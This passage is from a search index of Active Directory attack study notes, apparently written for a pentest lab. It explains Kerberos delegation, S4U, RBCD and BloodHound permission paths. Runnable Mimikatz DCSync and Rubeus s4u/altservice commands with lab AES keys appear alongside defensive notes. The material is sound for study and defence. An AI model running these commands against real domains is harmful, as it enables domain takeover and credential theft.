\"lsadump::Evasive-dcsync /user:dcorp\\\\krbtgt\" This will perform a DCSync — mimicking a DC and requesting password hashes from Active Directory. ✅ You now have the KRBTGT hash , which means you can: Forge Golden Tickets Persist indefinitely in the environment Become any user in the domain image.png OR image.png image.png Now using this AES key we can perform diamond ticket attack and gain the persistance of DC"},{"id":"constrained-delegation","u":"01_attacks-lateral-movement.html#constrained-delegation","sec":"Attacks + Lateral Movement","lvl":2,"t":"Constrained Delegation","c":""},{"id":"understanding-the-core-concept-6","u":"01_attacks-lateral-movement.html#understanding-the-core-concept-6","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"why-constrained-delegation-exists-double-hop-problem","u":"01_attacks-lateral-movement.html#why-constrained-delegation-exists-double-hop-problem","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ Why Constrained Delegation Exists (Double Hop Problem)","c":"Imagine this setup: User → WEB01 → SQL01 Example scenario: User Alice logs into a web application on WEB01 The web application needs to query SQL01 as Alice But Kerberos has a rule: A service cannot reuse a user’s TGT to authenticate to another service. So when Alice connects: Alice → WEB01 WEB01 receives: Alice's TGS for HTTP/WEB01 But WEB01 cannot use that ticket to authenticate to SQL01. So this fails: WEB01 → SQL01 (as Alice) This is called the Double Hop Problem . Hop 1: Alice → WEB01 Hop 2: WEB01 → SQL01 ❌ blocked"},{"id":"microsofts-solution-delegation","u":"01_attacks-lateral-movement.html#microsofts-solution-delegation","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ Microsoft’s Solution: Delegation","c":"Microsoft introduced delegation so a service could act on behalf of a user. There are three types: Unconstrained Delegation Constrained Delegation Resource-Based Constrained Delegation (RBCD) You already studied RBCD , so now we look at Constrained Delegation ."},{"id":"how-constrained-delegation-works","u":"01_attacks-lateral-movement.html#how-constrained-delegation-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ How Constrained Delegation Works","c":"With constrained delegation, the delegating service is configured to access only specific services . This configuration is stored in: ➡ Control over the delegating service account That account can be: a computer account (WEB01$) a service account (websvc) sometimes even a user account WEB01$ msDS-AllowedToDelegateTo: MSSQLSvc/SQL01.domain.local CIFS/FILE01.domain.local Meaning: WEB01 can impersonate users ONLY to SQL01 and FILE01 Not to DC, not to CIFS, not to LDAP."},{"id":"how-the-configuration-verification-part-works---correction-needed","u":"01_attacks-lateral-movement.html#how-the-configuration-verification-part-works---correction-needed","sec":"Attacks + Lateral Movement","lvl":3,"t":"How the configuration & verification part works ?? - Correction Needed","c":""},{"id":"kerberos-s4u-extensions-what-they-actually-enable","u":"01_attacks-lateral-movement.html#kerberos-s4u-extensions-what-they-actually-enable","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ Kerberos S4U Extensions (What They Actually Enable)","c":"Kerberos originally required the user to present credentials to get a ticket. But Microsoft added two extensions so services can request tickets for users . These extensions are defined in the Kerberos extension: Service for User to Self (S4U2Self) Service for User to Proxy (S4U2Proxy) These allow protocol transition + delegation . So the flow becomes: Service → KDC → \"Give me ticket for user\" without the user providing a password. But the KDC performs several validations before issuing anything."},{"id":"required-ad-configuration-before-any-s4u-works","u":"01_attacks-lateral-movement.html#required-ad-configuration-before-any-s4u-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Required AD Configuration (Before Any S4U Works)","c":"For constrained delegation , two AD settings must exist. 1️⃣ Delegation enabled on the service account Example service: WEB01$ AD setting in Delegation tab : Trust this computer for delegation to specified services Behind the scenes this sets: userAccountControl flag: TRUSTED_TO_AUTH_FOR_DELEGATION This allows protocol transition (S4U2Self). Without this flag: S4U2Self = denied 2️⃣ Allowed services list Attribute: WEB01$ msDS-AllowedToDelegateTo: MSSQLSvc/SQL01.domain.local CIFS/FILE01.domain.local This list tells the KDC: WEB01 can delegate ONLY to these SPNs The KDC checks this during S4U2Proxy ."},{"id":"step-by-step-deep-flow","u":"01_attacks-lateral-movement.html#step-by-step-deep-flow","sec":"Attacks + Lateral Movement","lvl":3,"t":"6️⃣ Step-by-Step Deep Flow","c":"Example environment: User: Alice Service: WEB01 Target: SQL01 Goal: WEB01 → access SQL01 as Alice Step 1 — Service Gets Its Own TGT First WEB01 authenticates normally. WEB01 → KDC Request: AS-REQ Response: AS-REP WEB01 receives: TGT for WEB01$ This ticket is encrypted with the krbtgt key . So now WEB01 can talk to the KDC. Step 2 — S4U2Self Request WEB01 sends a TGS request to the KDC. Request: Service: WEB01$ User to impersonate: Alice SPN requested: HTTP/WEB01 So it says: \"Give me a service ticket for Alice to access me\""},{"id":"what-the-kdc-checks","u":"01_attacks-lateral-movement.html#what-the-kdc-checks","sec":"Attacks + Lateral Movement","lvl":2,"t":"What the KDC Checks","c":"The Domain Controller now performs validations. Check 1 — Does the service exist? KDC looks up: servicePrincipalName = HTTP/WEB01 Finds: WEB01$ So the service is valid. Check 2 — Is protocol transition allowed? KDC checks: userAccountControl Specifically: TRUSTED_TO_AUTH_FOR_DELEGATION If missing: KDC_ERR_BADOPTION Ticket denied. Check 3 — Does the user exist? KDC looks up: Alice If user exists → continue. Check 4 — Is the user marked sensitive? KDC checks user attribute: Account is sensitive and cannot be delegated This corresponds to: USER_NOT_DELEGATED If enabled: S4U2Self denied Admins often enable this for: Domain Admins Privileged users"},{"id":"step-3-ticket-issued","u":"01_attacks-lateral-movement.html#step-3-ticket-issued","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 3 — Ticket Issued","c":"If all checks pass, the KDC issues Alice Ticket ( TGT ) to WEB01: Alice → HTTP/WEB01 ticket Important: This ticket contains: PAC (Privilege Attribute Certificate) Inside the PAC: User SID Group SIDs Privileges So WEB01 now has proof: Alice's identity But the ticket is still only valid for WEB01 ."},{"id":"step-4-s4u2proxy-request","u":"01_attacks-lateral-movement.html#step-4-s4u2proxy-request","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 4 — S4U2Proxy Request","c":"Now WEB01 wants to access SQL01. So it sends another TGS request to the KDC. Request includes: Alice → WEB01 ticket and asks for: Alice → MSSQLSvc/SQL01"},{"id":"what-the-kdc-checks-now","u":"01_attacks-lateral-movement.html#what-the-kdc-checks-now","sec":"Attacks + Lateral Movement","lvl":3,"t":"What the KDC Checks Now","c":"This is where constrained delegation validation happens . Check 1 — Is this ticket forwardable? The ticket issued in S4U2Self contains a flag: FORWARDABLE Without this flag: S4U2Proxy fails Check 2 — Is the delegating service allowed? KDC checks: msDS-AllowedToDelegateTo on: WEB01$ Example: WEB01$ msDS-AllowedToDelegateTo = MSSQLSvc/SQL01.domain.local If SQL01 is not in this list: KDC_ERR_POLICY Denied. Check 3 — SPN match The requested SPN must match exactly. Example allowed: MSSQLSvc/SQL01.domain.local But request: CIFS/SQL01 Would fail. Check 4 — User delegation restrictions Again KDC checks: USER_NOT_DELEGATED If set: Delegation blocked"},{"id":"step-5-final-ticket-issued","u":"01_attacks-lateral-movement.html#step-5-final-ticket-issued","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 5 — Final Ticket Issued","c":"KDC generates: Alice → MSSQLSvc/SQL01 Ticket. Encrypted with: SQL01 service key So only SQL01 can decrypt it."},{"id":"step-6-service-uses-ticket","u":"01_attacks-lateral-movement.html#step-6-service-uses-ticket","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 6 — Service Uses Ticket","c":"WEB01 now connects: WEB01 → SQL01 and presents the ticket. SQL01 decrypts it and sees: User = Alice So SQL server believes: Alice executed the query"},{"id":"visualizing-the-whole-process","u":"01_attacks-lateral-movement.html#visualizing-the-whole-process","sec":"Attacks + Lateral Movement","lvl":3,"t":"7️⃣ Visualizing the Whole Process","c":"1️⃣ WEB01 authenticates WEB01 → KDC get TGT 2️⃣ S4U2Self WEB01 → KDC request Alice → WEB01 3️⃣ KDC validates delegation flags user status 4️⃣ Ticket issued Alice → WEB01 5️⃣ S4U2Proxy WEB01 → KDC request Alice → SQL01 6️⃣ KDC checks msDS-AllowedToDelegateTo 7️⃣ Ticket issued Alice → SQL01 8️⃣ WEB01 connects to SQL01 using Alice's identity"},{"id":"why-this-is-dangerous-for-security","u":"01_attacks-lateral-movement.html#why-this-is-dangerous-for-security","sec":"Attacks + Lateral Movement","lvl":3,"t":"8️⃣ Why This Is Dangerous for Security","c":"If attackers compromise a server with delegation: WEB01$ they can run S4U requests for any domain user . Example impersonation: Administrator krbtgt Domain Admins If the allowed service includes something powerful like: CIFS/DC01 LDAP/DC01 Then attackers can reach the domain controller ."},{"id":"permission-that-can-lead-to-abuse-1","u":"01_attacks-lateral-movement.html#permission-that-can-lead-to-abuse-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Permission That Can Lead To Abuse","c":""},{"id":"what-permissions-enable-constrained-delegation-abuse","u":"01_attacks-lateral-movement.html#what-permissions-enable-constrained-delegation-abuse","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ What Permissions Enable Constrained Delegation Abuse","c":"For traditional constrained delegation , the configuration lives on the delegating account (user or computer). The key attribute is: msDS-AllowedToDelegateTo So if you can modify that attribute , you can configure delegation. The permissions that allow this are:"},{"id":"high-impact-permissions","u":"01_attacks-lateral-movement.html#high-impact-permissions","sec":"Attacks + Lateral Movement","lvl":3,"t":"High impact permissions","c":"Look for these edges in BloodHound: GenericAll GenericWrite WriteProperty WriteDacl WriteOwner These give the ability (directly or indirectly) to modify delegation settings."},{"id":"what-they-mean-practically","u":"01_attacks-lateral-movement.html#what-they-mean-practically","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ What They Mean Practically","c":""},{"id":"genericall","u":"01_attacks-lateral-movement.html#genericall","sec":"Attacks + Lateral Movement","lvl":3,"t":"GenericAll","c":"This is full control over the object . If you have: Attacker → GenericAll → WEB01$ You can modify: SPNs Delegation Password ACLs Group membership (for users) So you can set: msDS-AllowedToDelegateTo to anything you want. Example attack config: WEB01$ msDS-AllowedToDelegateTo = CIFS/DC01.domain.local Now WEB01 can impersonate users to the domain controller ."},{"id":"genericwrite","u":"01_attacks-lateral-movement.html#genericwrite","sec":"Attacks + Lateral Movement","lvl":3,"t":"GenericWrite","c":"This allows modification of most attributes . If you have: Attacker → GenericWrite → WEB01$ You can modify attributes like: msDS-AllowedToDelegateTo servicePrincipalName description etc So you can configure constrained delegation the same way."},{"id":"writeproperty","u":"01_attacks-lateral-movement.html#writeproperty","sec":"Attacks + Lateral Movement","lvl":3,"t":"WriteProperty","c":"This is attribute-specific write permission . If the permission includes: WriteProperty → msDS-AllowedToDelegateTo then you can directly configure constrained delegation. Sometimes BloodHound shows this as: WriteProperty on a computer object."},{"id":"writedacl","u":"01_attacks-lateral-movement.html#writedacl","sec":"Attacks + Lateral Movement","lvl":3,"t":"WriteDacl","c":"This allows modifying the ACL itself . So the attack becomes two steps: 1️⃣ Add your own permission Attacker → GenericAll → WEB01$ 2️⃣ Modify delegation settings."},{"id":"writeowner","u":"01_attacks-lateral-movement.html#writeowner","sec":"Attacks + Lateral Movement","lvl":3,"t":"WriteOwner","c":"This allows you to take ownership of the object . Ownership lets you modify the ACL. Flow: Take ownership ↓ Modify DACL ↓ Grant GenericAll ↓ Modify delegation"},{"id":"what-to-look-for-in-bloodhound","u":"01_attacks-lateral-movement.html#what-to-look-for-in-bloodhound","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ What To Look For In BloodHound","c":"Typical attack path queries include: GenericAll GenericWrite WriteDacl WriteOwner on: User accounts Computer accounts Service accounts Example graph: AttackerUser │ GenericWrite │ WEB01$ This means you can modify WEB01$ attributes ."},{"id":"how-attackers-actually-configure-constrained-delegation","u":"01_attacks-lateral-movement.html#how-attackers-actually-configure-constrained-delegation","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ How Attackers Actually Configure Constrained Delegation","c":"If you control: WEB01$ you modify: msDS-AllowedToDelegateTo Example malicious configuration: WEB01$ msDS-AllowedToDelegateTo: CIFS/DC01.domain.local LDAP/DC01.domain.local HOST/DC01.domain.local Now WEB01 can impersonate any user to the domain controller. Then the attacker performs: S4U2Self ↓ S4U2Proxy ↓ Administrator → DC01 Which results in domain compromise ."},{"id":"bloodhound-indicators-for-delegation-abuse","u":"01_attacks-lateral-movement.html#bloodhound-indicators-for-delegation-abuse","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ BloodHound Indicators For Delegation Abuse","c":"BloodHound highlights several related edges:"},{"id":"delegation-related-edges","u":"01_attacks-lateral-movement.html#delegation-related-edges","sec":"Attacks + Lateral Movement","lvl":3,"t":"Delegation-related edges","c":"AllowedToDelegate AllowedToAct (RBCD) TrustedToAuthForDelegation These show existing delegation relationships ."},{"id":"privilege-escalation-edges","u":"01_attacks-lateral-movement.html#privilege-escalation-edges","sec":"Attacks + Lateral Movement","lvl":3,"t":"Privilege escalation edges","c":"These show ability to modify delegation : GenericAll GenericWrite WriteDacl WriteOwner on service accounts or machines."},{"id":"quick-realistic-example","u":"01_attacks-lateral-movement.html#quick-realistic-example","sec":"Attacks + Lateral Movement","lvl":3,"t":"6️⃣ Quick Realistic Example","c":"Imagine BloodHound shows: User: john john │ GenericWrite │ WEB01$ Attack chain: 1️⃣ Modify delegation on WEB01 msDS-AllowedToDelegateTo = CIFS/DC01 2️⃣ Perform impersonation Administrator → WEB01 (S4U2Self) 3️⃣ Request delegated ticket Administrator → DC01 (S4U2Proxy) 4️⃣ Access domain controller shares \\\\DC01\\C$ Now attacker effectively has Domain Admin level access ."},{"id":"windows-setup-example-poc-1","u":"01_attacks-lateral-movement.html#windows-setup-example-poc-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Windows Setup + Example ( PoC )","c":""},{"id":"enumeration-of-constrained-delegation","u":"01_attacks-lateral-movement.html#enumeration-of-constrained-delegation","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔍 Enumeration of Constrained Delegation","c":""},{"id":"using-powerview","u":"01_attacks-lateral-movement.html#using-powerview","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔎 Using PowerView","c":"Get-DomainUser -TrustedToAuth OR Get-DomainComputer -TrustedToAuth This fetches users or computers that have: TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION set and msDS-AllowedToDelegateTo populated Get-DomainUser -TruestedToAuth —–> Returns Service accounts that have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION bit set Get-DomainComputer -TruestedToAuth - - - > Returns computer accounts (machine objects) that have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION bit set. image.png image.png The above screenshoot shoes websvc is allowed for delegation and can delegate for CIFS service on dcorp-mssql."},{"id":"using-activedirectory-module","u":"01_attacks-lateral-movement.html#using-activedirectory-module","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔎 Using ActiveDirectory Module","c":"Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne $null} -Properties msDS-AllowedToDelegateTo"},{"id":"exploiting-with-rubeus","u":"01_attacks-lateral-movement.html#exploiting-with-rubeus","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧪 Exploiting with Rubeus","c":"Let’s say we have compromised the websvc account. We have its AES256 hash , and it is trusted to delegate with protocol transition . Note:- below commands can be run on any domain joined command."},{"id":"step1-impersonate-administrator-to-cifs","u":"01_attacks-lateral-movement.html#step1-impersonate-administrator-to-cifs","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧬 Step1: Impersonate Administrator to CIFS:","c":"Using S4U to Get TGT+TGS in One Go: Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.local /ptt Explanation: /impersonateuser:Administrator : Who we want to impersonate( You will impersonate the Administrator account to the CIFS service on dcorp-mssql /msdsspn : The target service the websvc is allowed to delegate to /ptt : Pass-the-ticket (inject into current session) image.png image.png To check whether the Ticket has been imported in current user session you can use klist command, which will list all the available tickets klist image.png Above image shows that you are authenticated as Administrator for CIFS service"},{"id":"step2-access-targeted-resource","u":"01_attacks-lateral-movement.html#step2-access-targeted-resource","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step2: Access Targeted Resource","c":"dir \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$ You’re now accessing the C$ share as Domain Admin — without ever compromising their creds. image.png"},{"id":"bonus-abuse-via-alternate-services-altservice","u":"01_attacks-lateral-movement.html#bonus-abuse-via-alternate-services-altservice","sec":"Attacks + Lateral Movement","lvl":2,"t":"⚠️ Bonus: Abuse via Alternate Services (altservice)","c":"Sometimes, an SPN in msDS-AllowedToDelegateTo might seem harmless — like time/ — but because SPN values are cleartext , they can be altered with /altservice to access other services on same host ."},{"id":"example-4","u":"01_attacks-lateral-movement.html#example-4","sec":"Attacks + Lateral Movement","lvl":3,"t":"Example:","c":"step1: find the computers or service accounts which have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION set and has any service running on Domain Controller under the msDS-AllowedToDelegateTo option Get-DomainComputer -TruestedToAuth image.png above screenshot shows that DCORP-ADMINSRV$ computer is trusted to Auth for Time Service on DC. Step2 :- Use Rubeus for Constrained Delegation with Protocol Transition: Classic Constrained Delegation: Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e04 1d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local /ptt The above command runs Constrained Delegation attack for time service on the Domain Controller. Constrained Delegation with Protocol Transition: Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local **/altservice:ldap** /ptt /altservice:ldap :- verrides the service in the resulting TGS to be for LDAP , even though the SPN is time/... . This allows the attacker to perform DCSync (or other LDAP operations) as Administrator — without ever needing their credentials or interaction. image.png image.png Checking whether the TGS has been imported: image.png ✔ Now we can perform: lsadump::dcsync /user:dcorp\\krbtgt 📢 DCSync without Domain Admin compromise! image.png 🧠 Even though the account was trusted only to time service, we accessed LDAP on the same DC."},{"id":"defensive-notes","u":"01_attacks-lateral-movement.html#defensive-notes","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔐 Defensive Notes","c":"Limit use of delegation — especially Protocol Transition Use resource-based constrained delegation (RBCD) instead Regularly audit msDS-AllowedToDelegateTo and userAccountControl Monitor for: S4U2Self/S4U2Proxy usage Abnormal TGS request patterns Privileged users being impersonated"},{"id":"rbcd","u":"01_attacks-lateral-movement.html#rbcd","sec":"Attacks + Lateral Movement","lvl":2,"t":"RBCD","c":""},{"id":"understanding-the-core-concept-7","u":"01_attacks-lateral-movement.html#understanding-the-core-concept-7","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"core-idea-of-the-rbcd-attack-your-case","u":"01_attacks-lateral-movement.html#core-idea-of-the-rbcd-attack-your-case","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 Core Idea of the RBCD Attack (Your Case)","c":"Normally, delegation is configured on the service doing the delegation . But with Resource-Based Constrained Delegation , the target machine decides who can impersonate users to it . After your relay attack, the rule inside Active Directory becomes: WEB01 says: “I trust SWJFVMVD$ to impersonate users when accessing me.” So the attacker machine can now pretend to be any user when accessing WEB01. To perform an RBCD attack , you must be able to modify one attribute on the target computer object : msDS-AllowedToActOnBehalfOfOtherIdentity This attribute is stored on the target server’s AD object (example: WEB01$ ). So the attacker must have write capability over the target computer object in AD ."},{"id":"permissions-that-allow-rbcd","u":"01_attacks-lateral-movement.html#permissions-that-allow-rbcd","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔑 Permissions That Allow RBCD","c":"You can configure RBCD if you have any permission that allows writing attributes on the target object . Common ones are: Permission | Why It Works | — | — | GenericAll | Full control of the object | GenericWrite | Write most attributes | WriteProperty | Write specific attributes | WriteDACL | Modify object permissions | Owner | Can modify permissions |"},{"id":"genericall-full-control","u":"01_attacks-lateral-movement.html#genericall-full-control","sec":"Attacks + Lateral Movement","lvl":3,"t":"GenericAll (Full Control)","c":"This is the strongest permission . If you have: GenericAll on WEB01$ You can: modify attributes reset passwords modify delegation change ACLs So you can easily set: msDS-AllowedToActOnBehalfOfOtherIdentity Example conceptually: User: attacker Permission: GenericAll Target: WEB01$ So attacker can say: “WEB01 trusts my machine for delegation.”"},{"id":"genericwrite-1","u":"01_attacks-lateral-movement.html#genericwrite-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"GenericWrite","c":"This permission allows writing most attributes on the object . So if you have: GenericWrite on WEB01$ You can modify: msDS-AllowedToActOnBehalfOfOtherIdentity Because it is simply an attribute stored on the object. Example scenario: helpdesk_user │ GenericWrite │ WEB01$ Now helpdesk_user can configure RBCD."},{"id":"writeproperty-1","u":"01_attacks-lateral-movement.html#writeproperty-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"WriteProperty","c":"This is more granular. It allows modifying specific attributes . If the permission allows writing: msDS-AllowedToActOnBehalfOfOtherIdentity then RBCD can be configured. Example: attacker WriteProperty(msDS-AllowedToActOnBehalfOfOtherIdentity) WEB01$ This is enough to set delegation."},{"id":"writedacl-1","u":"01_attacks-lateral-movement.html#writedacl-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"WriteDACL","c":"This permission is very powerful. It allows modifying the ACL of the object . Meaning you can give yourself: GenericAll Then modify the delegation attribute. Flow: attacker │ WriteDACL on WEB01 │ Add GenericAll permission │ Modify RBCD attribute"},{"id":"ownership-writeowner","u":"01_attacks-lateral-movement.html#ownership-writeowner","sec":"Attacks + Lateral Movement","lvl":3,"t":"Ownership (WriteOwner)","c":"If you become owner of the object , you can modify its permissions. Example flow: attacker │ WriteOwner │ Becomes owner of WEB01 │ Modify ACL │ Gain GenericAll │ Configure RBCD Ownership always allows modifying the object’s permissions."},{"id":"conditions-to-perform-the-attack","u":"01_attacks-lateral-movement.html#conditions-to-perform-the-attack","sec":"Attacks + Lateral Movement","lvl":2,"t":"Conditions to Perform the Attack","c":""},{"id":"creating-a-computer-account-machineaccountquota","u":"01_attacks-lateral-movement.html#creating-a-computer-account-machineaccountquota","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ Creating a Computer Account (MachineAccountQuota)","c":"In Active Directory there is a domain setting: ms-DS-MachineAccountQuota = 10 This means: Any authenticated domain user or computers can create up to 10 computer objects . Example: User: john can create: ATTACKERPC$ inside AD. So after creation: Domain Computers ├─ WEB01$ ├─ DC01$ └─ ATTACKERPC$ Now john controls ATTACKERPC$ credentials . But notice something important: Creating a computer does NOT automatically give john control over WEB01 . So just creating a machine does not enable RBCD yet ."},{"id":"double-hop-problem-s4u2","u":"01_attacks-lateral-movement.html#double-hop-problem-s4u2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Double Hop Problem + S4U2","c":""},{"id":"first-what-is-the-double-hop-problem","u":"01_attacks-lateral-movement.html#first-what-is-the-double-hop-problem","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ First: What Is the Double Hop Problem?","c":"Imagine three machines: Client (user’s computer) WEB01 (web server) FILE01 (file server) User: dom Servers: WEB01 FILE01 Normal Kerberos Login User logs in and receives a TGT (Ticket Granting Ticket): TGT(dom) Then the user accesses the web server. The KDC issues: TGS(dom → WEB01) So now: dom → WEB01 WEB01 knows the user is dom ."},{"id":"now-the-web-server-needs-the-file-server","u":"01_attacks-lateral-movement.html#now-the-web-server-needs-the-file-server","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ Now the Web Server Needs the File Server","c":"The web application needs a file from FILE01. So WEB01 tries to access FILE01. But here is the problem. WEB01 does not have dom’s TGT . It only has the service ticket : TGS(dom → WEB01) So WEB01 cannot request: TGS(dom → FILE01) because only the client owns the TGT ."},{"id":"this-is-the-double-hop-problem","u":"01_attacks-lateral-movement.html#this-is-the-double-hop-problem","sec":"Attacks + Lateral Movement","lvl":3,"t":"This Is the Double Hop Problem","c":"Hop 1: dom → WEB01 Hop 2: WEB01 → FILE01 Kerberos does not allow the second hop , because the web server cannot impersonate the user. So access fails."},{"id":"microsofts-solution-delegation-1","u":"01_attacks-lateral-movement.html#microsofts-solution-delegation-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Microsoft’s Solution: Delegation","c":"Microsoft introduced delegation so services could act on behalf of users. There are different types: Unconstrained delegation Constrained delegation Resource-Based Constrained Delegation (RBCD) But all of them rely on the same Kerberos extension: S4U (Service for User)"},{"id":"s4u-extension-overview","u":"01_attacks-lateral-movement.html#s4u-extension-overview","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ S4U Extension Overview","c":"S4U contains two steps: S4U2Self S4U2Proxy Think of them as: Step 1 → pretend user logged into me Step 2 → access another service as that user"},{"id":"step-1-s4u2self-service-pretends-user-logged-in","u":"01_attacks-lateral-movement.html#step-1-s4u2self-service-pretends-user-logged-in","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Step 1: S4U2Self (Service Pretends User Logged In)","c":"The service asks the KDC: “Give me a ticket for user dom to my own service.” Example request: Service: WEB01 User: dom The KDC issues: TGS(dom → WEB01) Important detail: This ticket is not coming from the user . The service requested it itself . So now WEB01 can say: “I am acting on behalf of dom.” But it still cannot access FILE01 yet ."},{"id":"step-2-s4u2proxy-second-hop","u":"01_attacks-lateral-movement.html#step-2-s4u2proxy-second-hop","sec":"Attacks + Lateral Movement","lvl":2,"t":"6️⃣ Step 2: S4U2Proxy (Second Hop)","c":"Now the service asks again: “I have a ticket representing dom to me. Now give me a ticket for dom → FILE01 .” So request becomes: TGS(dom → FILE01) But before issuing it, the KDC checks delegation permissions. It asks: Is WEB01 allowed to impersonate users to FILE01? If delegation is configured, the KDC approves. Then it issues: TGS(dom → FILE01) Now WEB01 can access FILE01 as dom ."},{"id":"visual-flow-legitimate-delegation","u":"01_attacks-lateral-movement.html#visual-flow-legitimate-delegation","sec":"Attacks + Lateral Movement","lvl":3,"t":"7️⃣ Visual Flow (Legitimate Delegation)","c":"User dom logs in │ ▼ TGT(dom) dom → WEB01 │ ▼ WEB01 receives TGS(dom → WEB01) S4U2Self WEB01 asks KDC → \"give me ticket for dom → WEB01\" S4U2Proxy WEB01 asks KDC → \"give me ticket for dom → FILE01\" KDC checks delegation permissions KDC issues: TGS(dom → FILE01) WEB01 accesses FILE01 as dom"},{"id":"important-tgt-vs-tgs-in-s4u","u":"01_attacks-lateral-movement.html#important-tgt-vs-tgs-in-s4u","sec":"Attacks + Lateral Movement","lvl":3,"t":"8️⃣ Important: TGT vs TGS in S4U","c":"Here is something many people misunderstand. S4U never gives you the user’s TGT . It only gives service tickets (TGS) . So after S4U you get: TGS(dom → WEB01) TGS(dom → FILE01) But you never receive: TGT(dom) That’s why S4U is considered safer than unconstrained delegation."},{"id":"now-lets-connect-this-to-your-rbcd-attack","u":"01_attacks-lateral-movement.html#now-lets-connect-this-to-your-rbcd-attack","sec":"Attacks + Lateral Movement","lvl":3,"t":"9️⃣ Now Let’s Connect This to Your RBCD Attack","c":"Actors in your attack: Attacker machine → SWJFVMVD$ Target server → WEB01 User to impersonate → Administrator During the relay attack you configured: WEB01 trusts SWJFVMVD$ for delegation So now Kerberos policy becomes: SWJFVMVD$ can impersonate users to WEB01"},{"id":"s4u2self-in-your-attack","u":"01_attacks-lateral-movement.html#s4u2self-in-your-attack","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔟 S4U2Self in Your Attack","c":"Your attacker machine asks the KDC: “Give me a ticket for Administrator → SWJFVMVD$ .” KDC issues: TGS(Administrator → SWJFVMVD$) This means: SWJFVMVD$ is acting as Administrator But this ticket still cannot access WEB01."},{"id":"s4u2proxy-in-your-attack","u":"01_attacks-lateral-movement.html#s4u2proxy-in-your-attack","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣1️⃣ S4U2Proxy in Your Attack","c":"Now your machine asks the KDC again: “Give me a ticket for Administrator → WEB01 .” The KDC checks: Does WEB01 allow SWJFVMVD$ delegation? Because of RBCD the answer is: YES So the KDC issues: TGS(Administrator → WEB01)"},{"id":"final-result-1","u":"01_attacks-lateral-movement.html#final-result-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣2️⃣ Final Result","c":"Now the attacker has a service ticket that says: User = Administrator Service = WEB01 So when connecting to WEB01: WEB01 trusts the ticket And the attacker becomes: Administrator on WEB01 without knowing the password."},{"id":"one-sentence-summary","u":"01_attacks-lateral-movement.html#one-sentence-summary","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 One Sentence Summary","c":"The double hop problem prevents a service from impersonating a user to another service. S4U2Self + S4U2Proxy solve this by letting a service ask the KDC for impersonation tickets , and RBCD defines which services are allowed to do that ."},{"id":"how-the-configuration-verification-part-works","u":"01_attacks-lateral-movement.html#how-the-configuration-verification-part-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"How the configuration & verification part works ??","c":""},{"id":"where-the-rbcd-setting-actually-lives","u":"01_attacks-lateral-movement.html#where-the-rbcd-setting-actually-lives","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ Where the RBCD Setting Actually Lives","c":"RBCD is stored in the target computer object in Active Directory. Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity Important detail: This attribute is not just a string or SID . It is a Security Descriptor (SD) — basically an ACL. Think of it like a mini access control list inside the computer object . Example conceptually: Object: WEB01$ Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity Allow: ATTACKER$ Security Descriptor: Allow SID ATTACKER$ to delegate Allow: ATTACKER$ So the DC stores something like: DACL: ACE: ALLOW ATTACKER$ SID Meaning: ATTACKER$ can act on behalf of users to 